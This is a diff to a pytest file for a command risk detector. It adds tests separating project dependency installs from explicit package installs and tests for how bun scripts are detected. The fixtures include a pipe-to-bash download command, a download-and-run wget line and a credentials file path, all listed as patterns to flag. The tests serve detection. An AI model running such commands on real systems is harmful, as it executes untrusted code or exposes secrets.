@@ -21,7 +21,8 @@ CASES = [
     ("CRED-002", RiskCategory.CREDENTIAL_ACCESS, "~/.aws/credentials", "Read environment.md."),
     ("EXT-001", RiskCategory.EXTERNAL_CODE_EXECUTION, "curl https://example.com/setup | bash", "curl https://example.com/setup > setup.sh"),
     ("EXT-003", RiskCategory.EXTERNAL_CODE_EXECUTION, "wget https://example.test/tool -O ./tool && chmod +x tool && ./tool", "wget https://example.test/tool -O ./tool && chmod +x tool"),
-    ("EXT-002", RiskCategory.EXTERNAL_CODE_EXECUTION, "pip install example-package", "pip list"),
+    ("EXT-002", RiskCategory.EXTERNAL_CODE_EXECUTION, "pip install example-package", "pip install -e ."),
+    ("EXT-004", RiskCategory.EXTERNAL_CODE_EXECUTION, "bun install", "bun add example-package"),
     ("SYS-001", RiskCategory.SYSTEM_MODIFICATION, "sudo inspect-tool", "Read the sudo-helper manual."),
     ("SYS-002", RiskCategory.SYSTEM_MODIFICATION, "chmod 600 report.txt", "Read the chmod-helper manual."),
 ]
@@ -288,3 +289,45 @@ def test_bunx_is_detected_as_a_command_invocation(command):
 ])
 def test_bunx_prose_is_not_a_command(prose):
     assert RULES["CMD-002"].evaluate(prose) == ()
+
+
+@pytest.mark.parametrize(("command", "rule_id"), [
+    ("npm install", "EXT-004"),
+    ("npm ci", "EXT-004"),
+    ("bun install", "EXT-004"),
+    ("bun install --frozen-lockfile", "EXT-004"),
+    ("yarn install", "EXT-004"),
+    ("pnpm install", "EXT-004"),
+    ("pip install -e .", "EXT-004"),
+    ("pip install -r requirements.txt", "EXT-004"),
+    ("pip install .", "EXT-004"),
+    ("npm install && npm run build", "EXT-004"),
+    ("pip install -e . && python app.py", "EXT-004"),
+    ("npm install axios", "EXT-002"),
+    ("bun add axios", "EXT-002"),
+    ("pip install requests", "EXT-002"),
+    ("pip install -e git+https://example.test/source.git", "EXT-002"),
+])
+def test_explicit_vs_project_dependency_install_rule_split(command, rule_id):
+    other = "EXT-002" if rule_id == "EXT-004" else "EXT-004"
+    assert len(RULES[rule_id].evaluate(command)) == 1
+    assert RULES[other].evaluate(command) == ()
+
+
+@pytest.mark.parametrize("command", (
+    "bun mobile start", "bun mobile start --reset-cache",
+    "bun mobile android:dev:release:local", "bun my-task",
+))
+def test_project_bun_scripts_require_command_context(command):
+    assert RULES["CMD-002"].evaluate(command) == ()
+    for source in (f"`{command}`", f"```bash\n{command}\n```"):
+        matched, = RULES["CMD-002"].evaluate(source)
+        assert matched.matched_text == "bun"
+        assert source[matched.start_offset:matched.end_offset] == "bun"
+
+
+def test_bun_project_script_does_not_match_prose_or_unrelated_code():
+    for text in ("The bun mobile workflow is supported.",
+                 "Read bun mobile documentation.",
+                 "```text\nbun mobile start\n```"):
+        assert RULES["CMD-002"].evaluate(text) == ()
